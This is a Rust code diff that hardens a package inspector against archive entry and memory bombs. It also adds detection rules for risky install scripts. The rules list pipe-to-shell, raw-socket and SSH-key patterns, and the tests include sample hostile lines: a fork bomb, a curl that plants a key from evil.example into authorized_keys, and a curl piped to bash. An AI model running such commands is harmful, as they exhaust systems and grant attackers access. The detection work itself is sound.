@@ -287,6 +287,29 @@ pub struct PackageContents {
 
 const MAX_METADATA_BYTES: u64 = 256 * 1024;
 const MAX_ICON_BYTES: u64 = 2 * 1024 * 1024;
+/// Hard cap on archive entries during both inspection and extraction (blocks inode/entry bombs).
+pub const MAX_ARCHIVE_ENTRIES: usize = 100_000;
+/// Hard cap on total in-memory bytes buffered across icons + metadata during inspection (blocks OOM bombs).
+const MAX_TOTAL_INSPECT_BYTES: usize = 32 * 1024 * 1024;
+
+/// Read at most `max_entry` bytes without trusting archive header sizes, respecting `budget`.
+fn read_bounded_bytes<R: Read + ?Sized>(
+    reader: &mut R,
+    max_entry: u64,
+    budget: &mut usize,
+) -> Option<Vec<u8>> {
+    let cap = (max_entry as usize).min(*budget);
+    if cap == 0 {
+        return None;
+    }
+    let mut buf = Vec::new();
+    let mut limited = reader.take(cap as u64 + 1);
+    if limited.read_to_end(&mut buf).is_err() || buf.len() > cap {
+        return None;
+    }
+    *budget = budget.saturating_sub(buf.len());
+    Some(buf)
+}
 
 fn is_desktop_path(path: &str) -> bool {
     path.ends_with(".desktop")
@@ -402,11 +425,17 @@ pub fn inspect_contents(path: &Path, format: Format) -> Result<PackageContents, 
 fn list_tar<R: Read>(reader: R) -> Result<PackageContents, EasiError> {
     let mut archive = Archive::new(reader);
     let mut contents = PackageContents::default();
+    let mut inspect_budget = MAX_TOTAL_INSPECT_BYTES;
     let entries = archive
         .entries()
         .map_err(|e| EasiError::Archive(e.to_string()))?;
 
     for item in entries {
+        if contents.entries.len() >= MAX_ARCHIVE_ENTRIES {
+            return Err(EasiError::Archive(format!(
+                "archive exceeds maximum entry limit ({MAX_ARCHIVE_ENTRIES})"
+            )));
+        }
         let mut entry = item.map_err(|e| EasiError::Archive(e.to_string()))?;
         let raw_path = entry
             .path()
@@ -433,8 +462,10 @@ fn list_tar<R: Read>(reader: R) -> Result<PackageContents, EasiError> {
             if (is_desktop_path(&raw_path) || is_metainfo_path(&raw_path))
                 && size <= MAX_METADATA_BYTES
             {
-                let mut text = String::new();
-                if entry.read_to_string(&mut text).is_ok() {
+                if let Some(bytes) =
+                    read_bounded_bytes(&mut entry, MAX_METADATA_BYTES, &mut inspect_budget)
+                    && let Ok(text) = String::from_utf8(bytes)
+                {
                     if is_desktop_path(&raw_path) {
                         contents.desktop_files.push((raw_path.clone(), text));
                     } else {
@@ -442,13 +473,16 @@ fn list_tar<R: Read>(reader: R) -> Result<PackageContents, EasiError> {
                     }
                 }
             } else if is_meta_hint_path(&raw_path) && size <= MAX_METADATA_BYTES {
-                let mut text = String::new();
-                if entry.read_to_string(&mut text).is_ok() {
+                if let Some(bytes) =
+                    read_bounded_bytes(&mut entry, MAX_METADATA_BYTES, &mut inspect_budget)
+                    && let Ok(text) = String::from_utf8(bytes)
+                {
                     absorb_meta_hint(&mut contents, &raw_path, &text);
                 }
             } else if is_icon_path(&raw_path) && size <= MAX_ICON_BYTES {
-                let mut buf = Vec::new();
-                if entry.read_to_end(&mut buf).is_ok() {
+                if let Some(buf) =
+                    read_bounded_bytes(&mut entry, MAX_ICON_BYTES, &mut inspect_budget)
+                {
                     contents.embedded_icons.push((raw_path.clone(), buf));
                 }
             } else {
@@ -479,7 +513,13 @@ fn list_zip(path: &Path) -> Result<PackageContents, EasiError> {
     let file = File::open(path)?;
     let mut zip =
         ZipArchive::new(BufReader::new(file)).map_err(|e| EasiError::Archive(e.to_string()))?;
+    if zip.len() > MAX_ARCHIVE_ENTRIES {
+        return Err(EasiError::Archive(format!(
+            "archive exceeds maximum entry limit ({MAX_ARCHIVE_ENTRIES})"
+        )));
+    }
     let mut contents = PackageContents::default();
+    let mut inspect_budget = MAX_TOTAL_INSPECT_BYTES;
 
     for i in 0..zip.len() {
         let mut entry = zip
@@ -496,16 +536,19 @@ fn list_zip(path: &Path) -> Result<PackageContents, EasiError> {
         let mut is_script = false;
 
         if is_symlink && size <= 4096 {
-            let mut target = String::new();
-            if entry.read_to_string(&mut target).is_ok() {
+            if let Some(bytes) = read_bounded_bytes(&mut entry, 4096, &mut inspect_budget)
+                && let Ok(target) = String::from_utf8(bytes)
+            {
                 symlink_target = Some(target);
             }
         } else if !is_dir && size > 0 {
             if (is_desktop_path(&raw_path) || is_metainfo_path(&raw_path))
                 && size <= MAX_METADATA_BYTES
             {
-                let mut text = String::new();
-                if entry.read_to_string(&mut text).is_ok() {
+                if let Some(bytes) =
+                    read_bounded_bytes(&mut entry, MAX_METADATA_BYTES, &mut inspect_budget)
+                    && let Ok(text) = String::from_utf8(bytes)
+                {
                     if is_desktop_path(&raw_path) {
                         contents.desktop_files.push((raw_path.clone(), text));
                     } else {
@@ -513,13 +556,16 @@ fn list_zip(path: &Path) -> Result<PackageContents, EasiError> {
                     }
                 }
             } else if is_meta_hint_path(&raw_path) && size <= MAX_METADATA_BYTES {
-                let mut text = String::new();
-                if entry.read_to_string(&mut text).is_ok() {
+                if let Some(bytes) =
+                    read_bounded_bytes(&mut entry, MAX_METADATA_BYTES, &mut inspect_budget)
+                    && let Ok(text) = String::from_utf8(bytes)
+                {
                     absorb_meta_hint(&mut contents, &raw_path, &text);
                 }
             } else if is_icon_path(&raw_path) && size <= MAX_ICON_BYTES {
-                let mut buf = Vec::new();
-                if entry.read_to_end(&mut buf).is_ok() {
+                if let Some(buf) =
+                    read_bounded_bytes(&mut entry, MAX_ICON_BYTES, &mut inspect_budget)
+                {
                     contents.embedded_icons.push((raw_path.clone(), buf));
                 }
             } else {
@@ -704,7 +750,13 @@ fn list_appimage_type2(path: &Path) -> Result<PackageContents, EasiError> {
         ..Default::default()
     };
 
+    let mut inspect_budget = MAX_TOTAL_INSPECT_BYTES;
     for node in fs.files() {
+        if contents.entries.len() >= MAX_ARCHIVE_ENTRIES {
+            return Err(EasiError::AppImage(format!(
+                "AppImage exceeds maximum entry limit ({MAX_ARCHIVE_ENTRIES})"
+            )));
+        }
         let rel = node
             .fullpath
             .to_string_lossy()
@@ -743,8 +795,9 @@ fn list_appimage_type2(path: &Path) -> Result<PackageContents, EasiError> {
             InnerNode::File(f) => {
                 let size = f.file_len() as u64;
                 if (is_desktop_path(&rel) || is_metainfo_path(&rel)) && size <= MAX_METADATA_BYTES {
-                    let mut buf = Vec::new();
-                    if fs.file(f).reader().read_to_end(&mut buf).is_ok()
+                    let mut r = fs.file(f).reader();
+                    if let Some(buf) =
+                        read_bounded_bytes(&mut r, MAX_METADATA_BYTES, &mut inspect_budget)
                         && let Ok(text) = String::from_utf8(buf)
                     {
                         if is_desktop_path(&rel) {
@@ -754,8 +807,10 @@ fn list_appimage_type2(path: &Path) -> Result<PackageContents, EasiError> {
                         }
                     }
                 } else if is_icon_path(&rel) && size <= MAX_ICON_BYTES {
-                    let mut buf = Vec::new();
-                    if fs.file(f).reader().read_to_end(&mut buf).is_ok() {
+                    let mut r = fs.file(f).reader();
+                    if let Some(buf) =
+                        read_bounded_bytes(&mut r, MAX_ICON_BYTES, &mut inspect_budget)
+                    {
                         contents.embedded_icons.push((rel.clone(), buf));
                     }
                 }
@@ -784,8 +839,14 @@ fn list_sevenz(path: &Path) -> Result<PackageContents, EasiError> {
     let mut reader = sevenz_rust::SevenZReader::open(path, sevenz_rust::Password::empty())
         .map_err(|e| EasiError::Archive(e.to_string()))?;
     let mut contents = PackageContents::default();
+    let mut inspect_budget = MAX_TOTAL_INSPECT_BYTES;
     reader
         .for_each_entries(|entry, data| {
+            if contents.entries.len() >= MAX_ARCHIVE_ENTRIES {
+                return Err(sevenz_rust::Error::other(format!(
+                    "archive exceeds maximum entry limit ({MAX_ARCHIVE_ENTRIES})"
+                )));
+            }
             let raw_path = entry.name().to_string();
             let size = entry.size();
             let is_dir = entry.is_directory();
@@ -797,8 +858,10 @@ fn list_sevenz(path: &Path) -> Result<PackageContents, EasiError> {
                 if (is_desktop_path(&raw_path) || is_metainfo_path(&raw_path))
                     && size <= MAX_METADATA_BYTES
                 {
-                    let mut text = String::new();
-                    if data.read_to_string(&mut text).is_ok() {
+                    if let Some(bytes) =
+                        read_bounded_bytes(data, MAX_METADATA_BYTES, &mut inspect_budget)
+                        && let Ok(text) = String::from_utf8(bytes)
+                    {
                         if is_desktop_path(&raw_path) {
                             contents.desktop_files.push((raw_path.clone(), text));
                         } else {
@@ -806,13 +869,15 @@ fn list_sevenz(path: &Path) -> Result<PackageContents, EasiError> {
                         }
                     }
                 } else if is_meta_hint_path(&raw_path) && size <= MAX_METADATA_BYTES {
-                    let mut text = String::new();
-                    if data.read_to_string(&mut text).is_ok() {
+                    if let Some(bytes) =
+                        read_bounded_bytes(data, MAX_METADATA_BYTES, &mut inspect_budget)
+                        && let Ok(text) = String::from_utf8(bytes)
+                    {
                         absorb_meta_hint(&mut contents, &raw_path, &text);
                     }
                 } else if is_icon_path(&raw_path) && size <= MAX_ICON_BYTES {
-                    let mut buf = Vec::new();
-                    if data.read_to_end(&mut buf).is_ok() {
+                    if let Some(buf) = read_bounded_bytes(data, MAX_ICON_BYTES, &mut inspect_budget)
+                    {
                         contents.embedded_icons.push((raw_path.clone(), buf));
                     }
                 } else {
@@ -940,9 +1005,40 @@ const SCRIPT_RULES: &[ScriptRule] = &[
         obfuscation: false,
     },
     ScriptRule {
-        needles: &["chmod +x", "chmod 7", "chown "],
+        needles: &["chmod +x", "chmod 7", "chmod +s", "chmod u+s", "chown "],
         description: "changes file permissions or ownership (chmod/chown)",
         obfuscation: false,
+    },
+    ScriptRule {
+        needles: &[":(){", ":|:", "fork()"],
+        description: "HIGH RISK: contains fork-bomb / rapid process-spawning pattern",
+        obfuscation: true,
+    },
+    ScriptRule {
+        needles: &[
+            "| sh",
+            "| bash",
+            "|sh",
+            "|bash",
+            "/dev/tcp/",
+            "mkfifo ",
+            "socat ",
+            "ncat ",
+        ],
+        description: "HIGH RISK: pipes remote data into a shell or opens raw sockets",
+        obfuscation: true,
+    },
+    ScriptRule {
+        needles: &[
+            ".ssh/",
+            ".gnupg/",
+            "authorized_keys",
+            "ld_preload",
+            "ld.so.preload",
+            "prompt_command",
+        ],
+        description: "HIGH RISK: touches SSH/GPG keys or shell/linker preload hooks",
+        obfuscation: true,
     },
     ScriptRule {
         needles: &[
@@ -1082,5 +1178,22 @@ mod tests {
             detect_friendly_unsupported(Path::new("foo.rpm"), b"\xed\xab\xee\xdb"),
             Some(EasiError::DistroPackage { .. })
         ));
+
+        // Static script analyzer flags fork bombs, pipe-to-shell, and SSH key tampering.
+        let bomb = analyze_shell_script(b"#!/bin/sh\n:(){ :|:& };:\n");
+        assert!(bomb.obfuscated);
+        assert!(bomb.actions.iter().any(|a| a.contains("fork-bomb")));
+
+        let trojan = analyze_shell_script(
+            b"#!/bin/sh\ncurl -s https://evil.example/k >> ~/.ssh/authorized_keys\ncurl https://evil.example | bash\n",
+        );
+        assert!(trojan.obfuscated);
+        assert!(trojan.actions.iter().any(|a| a.contains("SSH/GPG")));
+        assert!(
+            trojan
+                .actions
+                .iter()
+                .any(|a| a.contains("pipes remote data"))
+        );
     }
 }
